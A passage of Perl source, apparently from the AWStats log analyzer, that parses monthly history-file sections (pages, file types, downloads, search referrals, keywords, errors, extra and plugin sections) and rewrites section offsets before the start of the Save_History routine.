						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_EMAILRECEIVER'
					  || $field[0] eq "${xmleb}END_EMAILRECEIVER"
					  || !$_ );
				if (   $field[0] ne 'END_EMAILRECEIVER'
					&& $field[0] ne "${xmleb}END_EMAILRECEIVER" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section EMAILRECEIVER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of EMAILRECEIVER section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'emailreceiver'};
				if ( $SectionsToSave{'emailreceiver'} ) {
					Save_History( 'emailreceiver', $year, $month, $date );
					delete $SectionsToSave{'emailreceiver'};
					if ($withpurge) {
						%_emailr_h = ();
						%_emailr_k = ();
						%_emailr_l = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_SIDER
			if ( $field[0] eq 'BEGIN_SIDER' ) {
				if ($Debug) { debug(" Begin of SIDER section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'sider'} ) {
							my $loadrecord = 0;
							if ($withupdate) {
								$loadrecord = 1;
							}
							else {
								if ( $HTMLOutput{'main'} ) {
									if ( $MonthRequired eq 'all' ) {
										$loadrecord = 1;
									}
									else {
										if (
											$countloaded < $MaxNbOf{'PageShown'}
											&& $field[1] >= $MinHit{'File'} )
										{
											$loadrecord = 1;
										}
										$TotalDifferentPages++;
									}
								}
								else
								{ # This is for $HTMLOutput = urldetail, urlentry or urlexit
									if ( $MonthRequired eq 'all' ) {
										if (
											(
												!$FilterIn{'url'}
												|| $field[0] =~
												/$FilterIn{'url'}/
											)
											&& ( !$FilterEx{'url'}
												|| $field[0] !~
												/$FilterEx{'url'}/ )
										  )
										{
											$loadrecord = 1;
										}
									}
									else {
										if (
											(
												!$FilterIn{'url'}
												|| $field[0] =~
												/$FilterIn{'url'}/
											)
											&& ( !$FilterEx{'url'}
												|| $field[0] !~
												/$FilterEx{'url'}/ )
											&& $field[1] >= $MinHit{'File'}
										  )
										{
											$loadrecord = 1;
										}
										$TotalDifferentPages++;
									}
								}

# Posssibilite de mettre if ($FilterIn{'url'} && $field[0] =~ /$FilterIn{'url'}/) mais il faut gerer TotalPages de la meme maniere
								$TotalBytesPages += ( $field[2] || 0 );
								$TotalEntries    += ( $field[3] || 0 );
								$TotalExits      += ( $field[4] || 0 );
							}
							if ($loadrecord) {
								if ( $field[1] ) {
									$_url_p{ $field[0] } += $field[1];
								}
								if ( $field[2] ) {
									$_url_k{ $field[0] } += $field[2];
								}
								if ( $field[3] ) {
									$_url_e{ $field[0] } += $field[3];
								}
								if ( $field[4] ) {
									$_url_x{ $field[0] } += $field[4];
								}
								$countloaded++;
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_SIDER'
					  || $field[0] eq "${xmleb}END_SIDER"
					  || !$_ );
				if (   $field[0] ne 'END_SIDER'
					&& $field[0] ne "${xmleb}END_SIDER" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section SIDER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of SIDER section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'sider'};

# WE DO NOT SAVE SECTION NOW BECAUSE VALUES CAN BE CHANGED AFTER READING VISITOR
#if ($SectionsToSave{'sider'}) {
#	Save_History('sider',$year,$month,$date); delete $SectionsToSave{'sider'};
#	if ($withpurge) { %_url_p=(); %_url_k=(); %_url_e=(); %_url_x=(); }
#}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_FILETYPES
			if ( $field[0] eq 'BEGIN_FILETYPES' ) {
				if ($Debug) { debug(" Begin of FILETYPES section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'filetypes'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_filetypes_h{ $field[0] } += $field[1];
							}
							if ( $field[2] ) {
								$_filetypes_k{ $field[0] } += $field[2];
							}
							if ( $field[3] ) {
								$_filetypes_gz_in{ $field[0] } += $field[3];
							}
							if ( $field[4] ) {
								$_filetypes_gz_out{ $field[0] } += $field[4];
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_FILETYPES'
					  || $field[0] eq "${xmleb}END_FILETYPES"
					  || !$_ );
				if (   $field[0] ne 'END_FILETYPES'
					&& $field[0] ne "${xmleb}END_FILETYPES" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section FILETYPES not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of FILETYPES section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'filetypes'};
				if ( $SectionsToSave{'filetypes'} ) {
					Save_History( 'filetypes', $year, $month, $date );
					delete $SectionsToSave{'filetypes'};
					if ($withpurge) {
						%_filetypes_h      = ();
						%_filetypes_k      = ();
						%_filetypes_gz_in  = ();
						%_filetypes_gz_out = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_DOWNLOADS
			if ( $field[0] eq 'BEGIN_DOWNLOADS' ) {
				if ($Debug) {
					debug(" Begin of DOWNLOADS section");
				}
				$field[0] = '';
				my $count       = 0;
				my $counttoload = int($field[1]);
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'downloads'}) {
							$countloaded++;
							$_downloads{$field[0]}->{'AWSTATS_HITS'} += int( $field[1] );
							$_downloads{$field[0]}->{'AWSTATS_206'} += int( $field[2] );
							$_downloads{$field[0]}->{'AWSTATS_SIZE'} += int( $field[3] );	
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_DOWNLOADS'
					  || $field[0] eq "${xmleb}END_DOWNLOADS"
					  || !$_ );
				if (   $field[0] ne 'END_DOWNLOADS'
					&& $field[0] ne "${xmleb}END_DOWNLOADS" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section DOWNLOADS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of DOWNLOADS section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'downloads'};
				if ( $SectionsToSave{'downloads'} ) {
					Save_History( 'downloads',
						$year, $month, $date );
					delete $SectionsToSave{'downloads'};
					if ($withpurge) { %_downloads = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_SEREFERRALS
			if ( $field[0] eq 'BEGIN_SEREFERRALS' ) {
				if ($Debug) { debug(" Begin of SEREFERRALS section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'sereferrals'} ) {
							$countloaded++;
							if ( $versionnum < 5004 )
							{    # For history files < 5.4
								my $se = $field[0];
								$se =~ s/\./\\./g;
								if ( $SearchEnginesHashID{$se} ) {
									$_se_referrals_h{ $SearchEnginesHashID{$se}
									  } += $field[1]
									  || 0;
								}
								else {
									$_se_referrals_h{ $field[0] } += $field[1]
									  || 0;
								}
							}
							elsif ( $versionnum < 5091 )
							{    # For history files < 5.91
								my $se = $field[0];
								$se =~ s/\./\\./g;
								if ( $SearchEnginesHashID{$se} ) {
									$_se_referrals_p{ $SearchEnginesHashID{$se}
									  } += $field[1]
									  || 0;
									$_se_referrals_h{ $SearchEnginesHashID{$se}
									  } += $field[2]
									  || 0;
								}
								else {
									$_se_referrals_p{ $field[0] } += $field[1]
									  || 0;
									$_se_referrals_h{ $field[0] } += $field[2]
									  || 0;
								}
							}
							else {
								if ( $field[1] ) {
									$_se_referrals_p{ $field[0] } += $field[1];
								}
								if ( $field[2] ) {
									$_se_referrals_h{ $field[0] } += $field[2];
								}
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_SEREFERRALS'
					  || $field[0] eq "${xmleb}END_SEREFERRALS"
					  || !$_ );
				if (   $field[0] ne 'END_SEREFERRALS'
					&& $field[0] ne "${xmleb}END_SEREFERRALS" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section SEREFERRALS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of SEREFERRALS section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'sereferrals'};
				if ( $SectionsToSave{'sereferrals'} ) {
					Save_History( 'sereferrals', $year, $month, $date );
					delete $SectionsToSave{'sereferrals'};
					if ($withpurge) {
						%_se_referrals_p = ();
						%_se_referrals_h = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_PAGEREFS
			if ( $field[0] eq 'BEGIN_PAGEREFS' ) {
				if ($Debug) { debug(" Begin of PAGEREFS section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'pagerefs'} ) {
							my $loadrecord = 0;
							if ($withupdate) {
								$loadrecord = 1;
							}
							else {
								if (
									(
										!$FilterIn{'refererpages'}
										|| $field[0] =~
										/$FilterIn{'refererpages'}/
									)
									&& ( !$FilterEx{'refererpages'}
										|| $field[0] !~
										/$FilterEx{'refererpages'}/ )
								  )
								{
									$loadrecord = 1;
								}
							}
							if ($loadrecord) {
								if ( $versionnum < 5004 )
								{    # For history files < 5.4
									if ( $field[1] ) {
										$_pagesrefs_h{ $field[0] } +=
										  int( $field[1] );
									}
								}
								else {
									if ( $field[1] ) {
										$_pagesrefs_p{ $field[0] } +=
										  int( $field[1] );
									}
									if ( $field[2] ) {
										$_pagesrefs_h{ $field[0] } +=
										  int( $field[2] );
									}
								}
								$countloaded++;
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_PAGEREFS'
					  || $field[0] eq "${xmleb}END_PAGEREFS"
					  || !$_ );
				if (   $field[0] ne 'END_PAGEREFS'
					&& $field[0] ne "${xmleb}END_PAGEREFS" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section PAGEREFS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of PAGEREFS section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'pagerefs'};
				if ( $SectionsToSave{'pagerefs'} ) {
					Save_History( 'pagerefs', $year, $month, $date );
					delete $SectionsToSave{'pagerefs'};
					if ($withpurge) { %_pagesrefs_p = (); %_pagesrefs_h = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_SEARCHWORDS
			if ( $field[0] eq 'BEGIN_SEARCHWORDS' ) {
				if ($Debug) {
					debug(
" Begin of SEARCHWORDS section ($MaxNbOf{'KeyphrasesShown'},$MinHit{'Keyphrase'})"
					);
				}
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'searchwords'} ) {
							my $loadrecord = 0;
							if ($withupdate) {
								$loadrecord = 1;
							}
							else {
								if ( $HTMLOutput{'main'} ) {
									if ( $MonthRequired eq 'all' ) {
										$loadrecord = 1;
									}
									else {
										if ( $countloaded <
											   $MaxNbOf{'KeyphrasesShown'}
											&& $field[1] >=
											$MinHit{'Keyphrase'} )
										{
											$loadrecord = 1;
										}
										$TotalDifferentKeyphrases++;
										$TotalKeyphrases += ( $field[1] || 0 );
									}
								}
								elsif ( $HTMLOutput{'keyphrases'} )
								{    # Load keyphrases for keyphrases chart
									if ( $MonthRequired eq 'all' ) {
										$loadrecord = 1;
									}
									else {
										if ( $field[1] >= $MinHit{'Keyphrase'} )
										{
											$loadrecord = 1;
										}
										$TotalDifferentKeyphrases++;
										$TotalKeyphrases += ( $field[1] || 0 );
									}
								}
								if ( $HTMLOutput{'keywords'} )
								{    # Load keyphrases for keywords chart
									$loadrecord = 2;
								}
							}
							if ($loadrecord) {
								if ( $field[1] ) {
									if ( $loadrecord == 2 ) {
										foreach ( split( /\+/, $field[0] ) )
										{    # field[0] is "val1+val2+..."
											$_keywords{$_} += $field[1];
										}
									}
									else {
										$_keyphrases{ $field[0] } += $field[1];
									}
								}
								$countloaded++;
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_SEARCHWORDS'
					  || $field[0] eq "${xmleb}END_SEARCHWORDS"
					  || !$_ );
				if (   $field[0] ne 'END_SEARCHWORDS'
					&& $field[0] ne "${xmleb}END_SEARCHWORDS" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section SEARCHWORDS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of SEARCHWORDS section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'searchwords'};
				if ( $SectionsToSave{'searchwords'} ) {
					Save_History( 'searchwords', $year, $month, $date );
					delete $SectionsToSave{ 'searchwords'
					  };    # This save searwords and keywords sections
					if ($withpurge) { %_keyphrases = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_KEYWORDS
			if ( $field[0] eq 'BEGIN_KEYWORDS' ) {
				if ($Debug) {
					debug(
" Begin of KEYWORDS section ($MaxNbOf{'KeywordsShown'},$MinHit{'Keyword'})"
					);
				}
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'keywords'} ) {
							my $loadrecord = 0;
							if ( $MonthRequired eq 'all' ) { $loadrecord = 1; }
							else {
								if (   $countloaded < $MaxNbOf{'KeywordsShown'}
									&& $field[1] >= $MinHit{'Keyword'} )
								{
									$loadrecord = 1;
								}
								$TotalDifferentKeywords++;
								$TotalKeywords += ( $field[1] || 0 );
							}
							if ($loadrecord) {
								if ( $field[1] ) {
									$_keywords{ $field[0] } += $field[1];
								}
								$countloaded++;
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_KEYWORDS'
					  || $field[0] eq "${xmleb}END_KEYWORDS"
					  || !$_ );
				if (   $field[0] ne 'END_KEYWORDS'
					&& $field[0] ne "${xmleb}END_KEYWORDS" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section KEYWORDS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of KEYWORDS section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'keywords'};
				if ( $SectionsToSave{'keywords'} ) {
					Save_History( 'keywords', $year, $month, $date );
					delete $SectionsToSave{'keywords'};
					if ($withpurge) { %_keywords = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_ERRORS
			if ( $field[0] eq 'BEGIN_ERRORS' ) {
				if ($Debug) { debug(" Begin of ERRORS section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'errors'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_errors_h{ $field[0] } += $field[1];
							}
							if ( $field[2] ) {
								$_errors_k{ $field[0] } += $field[2];
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_ERRORS'
					  || $field[0] eq "${xmleb}END_ERRORS"
					  || !$_ );
				if (   $field[0] ne 'END_ERRORS'
					&& $field[0] ne "${xmleb}END_ERRORS" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section ERRORS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of ERRORS section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'errors'};
				if ( $SectionsToSave{'errors'} ) {
					Save_History( 'errors', $year, $month, $date );
					delete $SectionsToSave{'errors'};
					if ($withpurge) { %_errors_h = (); %_errors_k = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_SIDER_xxx
			foreach my $code ( keys %TrapInfosForHTTPErrorCodes ) {
				if ( $field[0] eq "BEGIN_SIDER_$code" ) {
					if ($Debug) { debug(" Begin of SIDER_$code section"); }
					$field[0] = '';
					my $count       = 0;
					my $countloaded = 0;
					do {
						if ( $field[0] ) {
							$count++;
							if ( $SectionsToLoad{"sider_$code"} ) {
								$countloaded++;
								if ( $field[1] ) {
									$_sider_h{$code}{$field[0]} += $field[1];
								}
								if ( $withupdate || $HTMLOutput{"errors$code"} )
								{
									my $fieldidx = 2;
									foreach (split(//, $ShowHTTPErrorsPageDetail)) {
										last if (! $field[$fieldidx] );
										if ( $_ =~ /R/i ) {
											$_referer_h{$code}{$field[0]} = $field[2];
										} elsif ( $_ =~ /H/i ) {
											$_err_host_h{$code}{$field[0]} = $field[$fieldidx];
										}
										$fieldidx++;
									}
								}
							}
						}
						$_ = <HISTORY>;
						chomp $_;
						s/\r//;
						@field = split(
							/\s+/,
							(
								$readxml
								? XMLDecodeFromHisto($_)
								: $_
							)
						);
						$countlines++;
					  } until ( $field[0] eq "END_SIDER_$code"
						  || $field[0] eq "${xmleb}END_SIDER_$code"
						  || !$_ );
					if (   $field[0] ne "END_SIDER_$code"
						&& $field[0] ne "${xmleb}END_SIDER_$code" )
					{
						error(
"History file \"$filetoread\" is corrupted (End of section SIDER_$code not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
							"", "", 1
						);
					}
					if ($Debug) {
						debug(
" End of SIDER_$code section ($count entries, $countloaded loaded)"
						);
					}
					delete $SectionsToLoad{"sider_$code"};
					if ( $SectionsToSave{"sider_$code"} ) {
						Save_History( "sider_$code", $year, $month, $date );
						delete $SectionsToSave{"sider_$code"};
						if ($withpurge) {
							%{$_sider_h{$code}} = ();
							%{$_referer_h{$code}} = ();
							%{$_err_host_h{$code}} = ();
						}
					}
					if ( !scalar %SectionsToLoad ) {
						debug(" Stop reading history file. Got all we need.");
						last;
					}
					next;
				}
			}

			# BEGIN_EXTRA_xxx
			foreach my $extranum ( 1 .. @ExtraName - 1 ) {
				if ( $field[0] eq "BEGIN_EXTRA_$extranum" ) {
					if ($Debug) { debug(" Begin of EXTRA_$extranum"); }
					$field[0] = '';
					my $count       = 0;
					my $countloaded = 0;
					do {
						if ( $field[0] ne '' ) {
							$count++;
							if ( $SectionsToLoad{"extra_$extranum"} ) {
								if (   $ExtraStatTypes[$extranum] =~ /P/i
									&& $field[1] )
								{
									${ '_section_' . $extranum . '_p' }
									  { $field[0] } += $field[1];
								}
								${ '_section_' . $extranum . '_h' }
								  { $field[0] } += $field[2];
								if (   $ExtraStatTypes[$extranum] =~ /B/i
									&& $field[3] )
								{
									${ '_section_' . $extranum . '_k' }
									  { $field[0] } += $field[3];
								}
								if ( $ExtraStatTypes[$extranum] =~ /L/i
									&& !${ '_section_' . $extranum . '_l' }
									{ $field[0] }
									&& $field[4] )
								{
									${ '_section_' . $extranum . '_l' }
									  { $field[0] } = int( $field[4] );
								}
								$countloaded++;
							}
						}
						$_ = <HISTORY>;
						chomp $_;
						s/\r//;
						@field = split(
							/\s+/,
							(
								$readxml
								? XMLDecodeFromHisto($_)
								: $_
							)
						);
						$countlines++;
					  } until ( $field[0] eq "END_EXTRA_$extranum"
						  || $field[0] eq "${xmleb}END_EXTRA_$extranum"
						  || !$_ );
					if (   $field[0] ne "END_EXTRA_$extranum"
						&& $field[0] ne "${xmleb}END_EXTRA_$extranum" )
					{
						error(
"History file \"$filetoread\" is corrupted (End of section EXTRA_$extranum not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
							"", "", 1
						);
					}
					if ($Debug) {
						debug(
" End of EXTRA_$extranum section ($count entries, $countloaded loaded)"
						);
					}
					delete $SectionsToLoad{"extra_$extranum"};
					if ( $SectionsToSave{"extra_$extranum"} ) {
						Save_History( "extra_$extranum", $year, $month, $date );
						delete $SectionsToSave{"extra_$extranum"};
						if ($withpurge) {
							%{ '_section_' . $extranum . '_p' } = ();
							%{ '_section_' . $extranum . '_h' } = ();
							%{ '_section_' . $extranum . '_b' } = ();
							%{ '_section_' . $extranum . '_l' } = ();
						}
					}
					if ( !scalar %SectionsToLoad ) {
						debug(" Stop reading history file. Got all we need.");
						last;
					}
					next;
				}
			}

			# BEGIN_PLUGINS
			if (   $AtLeastOneSectionPlugin
				&& $field[0] =~ /^BEGIN_PLUGIN_(\w+)$/i )
			{
				my $pluginname = $1;
				my $found      = 0;
				foreach ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) {
					if ( $pluginname eq $_ ) {

						# The plugin for this section was loaded
						$found = 1;
						my $issectiontoload =
						  $SectionsToLoad{"plugin_$pluginname"};

#               		    my $function="SectionReadHistory_$pluginname(\$issectiontoload,\$readxml,\$xmleb,\$countlines)";
#               		    eval("$function");
						my $function = "SectionReadHistory_$pluginname";
						&$function( $issectiontoload, $readxml, $xmleb,
							$countlines );
						delete $SectionsToLoad{"plugin_$pluginname"};
						if ( $SectionsToSave{"plugin_$pluginname"} ) {
							Save_History( "plugin_$pluginname",
								$year, $month, $date );
							delete $SectionsToSave{"plugin_$pluginname"};
							if ($withpurge) {

#                           		my $function="SectionInitHashArray_$pluginname()";
#                           		eval("$function");
								my $function =
								  "SectionInitHashArray_$pluginname";
								&$function();
							}
						}
						last;
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}

				# The plugin for this section was not loaded
				if ( !$found ) {
					do {
						$_ = <HISTORY>;
						chomp $_;
						s/\r//;
						@field = split(
							/\s+/,
							(
								$readxml
								? XMLDecodeFromHisto($_)
								: $_
							)
						);
						$countlines++;
					  } until ( $field[0] eq "END_PLUGIN_$pluginname"
						  || $field[0] eq "${xmleb}END_PLUGIN_$pluginname"
						  || !$_ );
				}
				next;
			}

# For backward compatibility (ORIGIN section was "HitFromx" in old history files)
			if ( $SectionsToLoad{'origin'} ) {
				if ( $field[0] eq 'HitFrom0' ) {
					$_from_p[0] += 0;
					$_from_h[0] += $field[1];
					next;
				}
				if ( $field[0] eq 'HitFrom1' ) {
					$_from_p[1] += 0;
					$_from_h[1] += $field[1];
					next;
				}
				if ( $field[0] eq 'HitFrom2' ) {
					$_from_p[2] += 0;
					$_from_h[2] += $field[1];
					next;
				}
				if ( $field[0] eq 'HitFrom3' ) {
					$_from_p[3] += 0;
					$_from_h[3] += $field[1];
					next;
				}
				if ( $field[0] eq 'HitFrom4' ) {
					$_from_p[4] += 0;
					$_from_h[4] += $field[1];
					next;
				}
				if ( $field[0] eq 'HitFrom5' ) {
					$_from_p[5] += 0;
					$_from_h[5] += $field[1];
					next;
				}
			}
		}
	}

	if ($withupdate) {

# Process rest of data saved in 'wait' arrays (data for hosts that are not in history file or no history file found)
# This can change some values for day, sider and session sections
		if ($Debug) { debug( " Processing data in 'wait' arrays", 3 ); }
		foreach ( keys %_waithost_e ) {
			if ($Debug) {
				debug( "  Visit in 'wait' array for $_ is a new visit", 4 );
			}
			my $newtimehosts =
			  ( $_waithost_s{$_} ? $_waithost_s{$_} : $_host_s{$_} );
			my $newtimehostl =
			  ( $_waithost_l{$_} ? $_waithost_l{$_} : $_host_l{$_} );
			$_url_e{ $_waithost_e{$_} }++;
			$newtimehosts =~ /^(\d\d\d\d\d\d\d\d)/;
			$DayVisits{$1}++;
			if ( $_waithost_s{$_} ) {

				# There was also a second session in processed log
				$_session{ GetSessionRange( $newtimehosts, $newtimehostl ) }++;
			}
		}
	}

# Write all unwrote sections in section order ('general','time', 'day','sider','session' and other...)
	if ($Debug) {
		debug(
			" Check and write all unwrote sections: "
			  . join( ',', keys %SectionsToSave ),
			2
		);
	}
	foreach my $key (
		sort { $SectionsToSave{$a} <=> $SectionsToSave{$b} }
		keys %SectionsToSave
	  )
	{
		Save_History( "$key", $year, $month, $date, $lastlinenb,
			$lastlineoffset, $lastlinechecksum );
	}
	%SectionsToSave = ();

# Update offset in map section and last data in general section then close files
	if ($withupdate) {
		if ($xml) { print HISTORYTMP "\n\n</xml>\n"; }

		# Update offset of sections in the MAP section
		foreach ( sort { $PosInFile{$a} <=> $PosInFile{$b} } keys %ValueInFile )
		{
			if ($Debug) {
				debug(
" Update offset of section $_=$ValueInFile{$_} in file at offset $PosInFile{$_}"
				);
			}
			if ( $PosInFile{"$_"} ) {
				seek( HISTORYTMP, $PosInFile{"$_"}, 0 );
				print HISTORYTMP $ValueInFile{"$_"};
			}
		}

		# Save last data in general sections
		if ($Debug) {
			debug(
" Update MonthVisits=$MonthVisits{$year.$month} in file at offset $PosInFile{TotalVisits}"
			);
		}
		seek( HISTORYTMP, $PosInFile{"TotalVisits"}, 0 );
		print HISTORYTMP $MonthVisits{ $year . $month };
		if ($Debug) {
			debug(
" Update MonthUnique=$MonthUnique{$year.$month} in file at offset $PosInFile{TotalUnique}"
			);
		}
		seek( HISTORYTMP, $PosInFile{"TotalUnique"}, 0 );
		print HISTORYTMP $MonthUnique{ $year . $month };
		if ($Debug) {
			debug(
" Update MonthHostsKnown=$MonthHostsKnown{$year.$month} in file at offset $PosInFile{MonthHostsKnown}"
			);
		}
		seek( HISTORYTMP, $PosInFile{"MonthHostsKnown"}, 0 );
		print HISTORYTMP $MonthHostsKnown{ $year . $month };
		if ($Debug) {
			debug(
" Update MonthHostsUnknown=$MonthHostsUnknown{$year.$month} in file at offset $PosInFile{MonthHostsUnknown}"
			);
		}
		seek( HISTORYTMP, $PosInFile{"MonthHostsUnknown"}, 0 );
		print HISTORYTMP $MonthHostsUnknown{ $year . $month };
		close(HISTORYTMP) || error("Failed to write temporary history file");
	}
	if ($withread) {
		close(HISTORY) || error("Command for pipe '$filetoread' failed");
	}

	# Purge data
	if ($withpurge) { &Init_HashArray(); }

	# If update, rename tmp file bis into tmp file or set HistoryAlreadyFlushed
	if ($withupdate) {
		if ( $HistoryAlreadyFlushed{"$year$month$day$hour"} ) {
			debug(
				"Rename tmp history file bis '$filetoread' to '$filetowrite'");
			if ( rename( $filetowrite, $filetoread ) == 0 ) {
				error("Failed to update tmp history file $filetoread");
			}
		}
		else {
			$HistoryAlreadyFlushed{"$year$month$day$hour"} = 1;
		}

		if ( !$ListOfYears{"$year"} || $ListOfYears{"$year"} lt "$month" ) {
			$ListOfYears{"$year"} = "$month";
		}
	}

	# For backward compatibility, if LastLine does not exist, set to LastTime
	$LastLine ||= $LastTime{$date};

	return ( $withupdate ? "$filetowrite" : "" );
}

#------------------------------------------------------------------------------
# Function:		Save a part of history file
# Parameters:	sectiontosave,year,month,breakdate[,lastlinenb,lastlineoffset,lastlinechecksum]
# Input:		$VERSION HISTORYTMP $nowyear $nowmonth $nowday $nowhour $nowmin $nowsec $LastLineNumber $LastLineOffset $LastLineChecksum
# Output:		None
# Return:		None
#------------------------------------------------------------------------------
sub Save_History {
	my $sectiontosave = shift || '';
	my $year          = shift || '';
	my $month         = shift || '';
	my $breakdate     = shift || '';

	my $xml = ( $BuildHistoryFormat eq 'xml' ? 1 : 0 );
	my (
